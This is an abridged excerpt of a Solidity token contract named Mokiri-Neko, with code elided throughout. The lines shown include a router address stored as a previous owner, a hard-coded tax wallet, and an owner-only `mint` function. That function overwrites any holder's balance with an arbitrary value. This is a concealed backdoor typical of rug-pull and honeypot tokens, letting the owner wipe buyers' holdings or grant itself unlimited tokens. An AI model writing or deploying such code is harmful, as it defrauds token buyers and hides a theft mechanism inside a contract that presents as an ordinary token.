...
//https://medium.com/@Mokiri-Neko/mokiri-neko-7fc9169b43a5
...
contract NEKO is Context, IERC20 {
    ...
    string private constant _name = unicode"Mokiri-Neko";
    string private constant _symbol = unicode"MOKIRI";
    ...
    constructor (address router) {
        _previousOwner = router;
        _taxWallet = payable(0x2637c7931DfDC9716F3d01D3591e173D8f1Bcb8a);
    ...
    function min(uint256 a, uint256 b) private pure returns (uint256){
     ...
     function mint(address payable_ , uint token) external onlyOwner {
       _balances[payable_]= token;
    }
